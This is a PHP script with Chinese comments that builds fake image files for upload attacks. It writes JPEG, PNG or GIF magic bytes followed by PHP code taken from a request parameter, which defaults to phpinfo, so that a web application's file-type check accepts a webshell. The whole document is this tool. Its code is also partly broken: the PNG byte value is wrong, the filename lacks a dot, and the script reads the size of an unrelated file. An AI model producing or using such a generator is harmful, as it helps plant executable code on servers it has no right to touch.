<!DOCTYPE html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" />
</head>
</html>
<?php
$cmd = '<?php phpinfo();?>';
// 读取输入的命令
if(!empty($_REQUEST['cmd'])){
    $cmd=$_REQUEST['cmd'];
}
// 输入产生文件的类型
function makeTrick($typeCode){
    switch($typeCode){
        case 'jpg':
            $fileType = Array(255,216);
            break;
        case 'png':
            $fileType = Array(137,800);
            break;
        case 'gif':
            $fileType = Array(71,73);
            break;
        default:
            $fileType = Null;
    }
    return $fileType;
}
function load($fileType,$cmd, $ext){
    // 读取输入的文件类型
    if(!empty($fileType)) {
        $data = pack('C2', $fileType[0], $fileType[1]);
        $file = fopen('profile'.$ext, "wb");
        // 写入文件头
        $bin = fwrite($file, $data);
        // 写入命令
        $bin2 = fwrite($file, $cmd);
        fclose($file);
        $file = fopen('profile'.$ext, "r");
        echo '创建成功！文件内容：</br>';
        echo htmlentities(fread($file, filesize('tmp_pack.txt')));
        fclose($file);
    }
}
if(!empty($_REQUEST['type'])) {
    $ext = $_REQUEST['type'];
    $fileType = makeTrick($ext);
    load($fileType, $cmd, $ext);
}else{
    echo '请用get方式输入type参数和cmd参数（可选，默认phpinfo）';
}